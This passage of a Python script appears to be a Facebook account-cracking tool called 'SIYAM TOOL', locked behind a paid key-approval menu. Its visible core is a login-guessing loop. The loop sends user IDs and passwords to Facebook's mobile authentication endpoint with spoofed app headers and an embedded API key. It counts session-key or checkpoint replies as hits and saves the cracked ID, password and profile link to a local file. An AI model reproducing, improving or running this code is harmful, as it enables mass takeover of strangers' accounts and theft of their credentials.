                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                speak("Valid Id Found")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{profile_link}\n")
                oks.append(uid)
                break
                
            elif 'www.facebook.com' in str(res.get('error', {}).get('message', '')):
                speak("Valid Id Found")
                profile_link = f"https://facebook.com/{uid}"
                
                print(f"\n{'='*50}")
                print(f"[+] UID       : {uid}")
                print(f"[+] PASSWORD  : {pw}")
                print(f"[+] PROFILE   : {profile_link}")
                print(f"{'='*50}\n")
                
                open('/sdcard/SIYAM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}|{profile_link}\n")
                oks.append(uid)
                break
                
        except Exception:
            pass
    
    loop += 1
    
    sys.stdout.write(f"\r[SIYAM-M2] LOOP:{loop} OK:{len(oks)}")
    sys.stdout.flush()

def get_whatsapp_link(user_key, message_type="approval"):
    if message_type == "renew":
        msg = f"Hello Admin, my key has expired. Please renew: {user_key}"
    elif message_type == "approval":
        msg = f"Hello Admin, please approve my key: {user_key}"
    else:
        msg = f"Hello Admin, regarding key: {user_key}"
    
    encoded_msg = urllib.parse.quote(msg)
    return f"https://wa.me/{ADMIN_NUMBER[1:]}?text={encoded_msg}"

# ========== MAIN FUNCTION ==========
def main():
    pull_from_github()
    auto_delete_expired_keys()
    
    while True:
        banner()
        print_line()
        print(f"{' ' * 15}{Y}SIYAM TOOL{RESET}")
        print_line()
        print()
        print(f"{' ' * 15}{C}[ SIYAM MAHMUD ]{RESET}")
        print()
        print(f"{' ' * 15}{R}[ APPROVAL SYSTEM ]{RESET}")
        print()
        
        speak("Welcome to Siyam Tool")
        
        master = input(f"{' ' * 8}{W}[?]{RESET}Press ENTER to get Key{RESET}")
        
        if master.upper() == "ADMIN01":
            admin_panel()
            continue
        
        user_key = get_user_key()
        
        keys = load_approved_keys()
        key_valid = False
        key_expired = False
        expiry_date = None
        is_new = True
        
        for item in keys:
            if item["key"] == user_key:
                is_new = False
                if item["expiry"] == "unlimited":
                    key_valid = True
                else:
                    if " " in item["expiry"]:
                        expiry_time = datetime.strptime(item["expiry"], "%Y-%m-%d %H:%M:%S")
                        if datetime.now() <= expiry_time:
                            key_valid = True
                        else:
                            key_expired = True
                            expiry_date = item["expiry"]
                    else:
                        expiry_date_obj = datetime.strptime(item["expiry"], "%Y-%m-%d").date()
                        if date.today() <= expiry_date_obj:
                            key_valid = True
                        else:
                            key_expired = True
                            expiry_date = item["expiry"]
                break
        
        print()
        print(f"{' ' * 8}{C}{'╔' + '═' * 34 + '╗'}{RESET}")
        print(f"{' ' * 8}{C}{'║'}{' ' * 34}{C}{'║'}{RESET}")
        print(f"{' ' * 8}{C}{'║'}{' ' * 11}{Y}YOUR KEY{C}{' ' * 14}{'║'}{RESET}")
        print(f"{' ' * 8}{C}{'║'}{' ' * 10}{Y}{user_key}{C}{' ' * 10}{'║'}{RESET}")
        print(f"{' ' * 8}{C}{'║'}{' ' * 34}{C}{'║'}{RESET}")
        print(f"{' ' * 8}{C}{'╚' + '═' * 34 + '╝'}{RESET}")
        
        print()
        print(f"{' ' * 8}{C}{'┌' + '─' * 34 + '┐'}{RESET}")
        print(f"{' ' * 8}{C}{'│'}{' ' * 34}{C}{'│'}{RESET}")
        
        if key_valid:
            print(f"{' ' * 8}{C}{'│'}{' ' * 11}{G}KEY ACTIVE{C}{' ' * 13}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 8}{W}[?]{RESET} Press ENTER to run tool{C}{' ' * 8}{'│'}{RESET}")
        elif key_expired:
            print(f"{' ' * 8}{C}{'│'}{' ' * 10}{R}KEY EXPIRED{C}{' ' * 14}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 4}{Y}[!] Expired on: {expiry_date}{C}{' ' * 4}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 4}{Y}[!] Send to admin for renewal{C}{' ' * 4}{'│'}{RESET}")
            speak("Your Key Expired Please Renew")
        elif is_new:
            print(f"{' ' * 8}{C}{'│'}{' ' * 10}{Y}NEW KEY{C}{' ' * 15}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 4}{W}[?]{RESET} Send to admin for approval{C}{' ' * 4}{'│'}{RESET}")
        else:
            print(f"{' ' * 8}{C}{'│'}{' ' * 9}{Y}KEY PENDING{C}{' ' * 14}{'│'}{RESET}")
            print(f"{' ' * 8}{C}{'│'}{' ' * 4}{W}[?]{RESET} Send to admin for approval{C}{' ' * 4}{'│'}{RESET}")
        
        print(f"{' ' * 8}{C}{'│'}{' ' * 8}{W}[*]{RESET} Copy Key: {Y}{user_key}{C}{' ' * 4}{'│'}{RESET}")
        print(f"{' ' * 8}{C}{'│'}{' ' * 8}{W}[*]{RESET} Send to: {C}{ADMIN_NUMBER}{C}{' ' * 3}{'│'}{RESET}")
        print(f"{' ' * 8}{C}{'│'}{' ' * 34}{C}{'│'}{RESET}")
        print(f"{' ' * 8}{C}{'└' + '─' * 34 + '┘'}{RESET}")
        print()
        
        if key_valid:
            print(f"{' ' * 8}{Y}[?] Press ENTER to run tool...{RESET}")
            input()
            speak("Welcome back!")
            print_line()
            print(f"{' ' * 10}{G}[✓]{RESET} Access Granted! Tool is running!")
            print(f"{' ' * 15}{G}>>> TOOL UNLOCKED <<<{RESET}")
            print_line()
            BNG_71_()
            return
        else:
            if key_expired:
                print(f"{' ' * 8}{Y}[?] Press ENTER to send renewal request via WhatsApp...{RESET}")
                input()
                print(f"{' ' * 8}{G}[+]{RESET} Your Key: {user_key}")
                print(f"{' ' * 8}{Y}[!]{RESET} Send this key to: {ADMIN_NUMBER}")
                open_admin_contact(ADMIN_LINK, ADMIN_NUMBER, user_key, is_renew=True)
                print(f"{' ' * 8}{Y}[?] Press ENTER after sending message...{RESET}")
                input()
            else:
                print(f"{' ' * 8}{Y}[?] Press ENTER to send request via WhatsApp...{RESET}")
                input()
                print(f"{' ' * 8}{G}[+]{RESET} Your Key: {user_key}")
                print(f"{' ' * 8}{Y}[!]{RESET} Send this key to: {ADMIN_NUMBER}")
                open_admin_contact(ADMIN_LINK, ADMIN_NUMBER, user_key, is_renew=False)
                print(f"{' ' * 8}{Y}[?] Press ENTER after sending message...{RESET}")
                input()
            
            if is_key_valid(user_key):
                speak("Access Granted! Welcome To Siyam Tool.")
                print_line()
                print(f"{' ' * 10}{G}[✓]{RESET} Key approved! Tool is running!")
                print(f"{' ' * 12}{G}>>> TOOL UNLOCKED <<<{RESET}")
                print_line()
                BNG_71_()
                return
            else:
                speak("Key still not approved.")
                print_line()
                print(f"{' ' * 13}{R}[!]{RESET} Key not approved yet!")
                print(f"{' ' * 10}{Y}[!]{RESET} Send this key: {user_key}")
                print_line()
                print(f"{' ' * 8}{Y}[?] Press ENTER to try again...{RESET}")
                input()

if __name__ == "__main__":
    main()
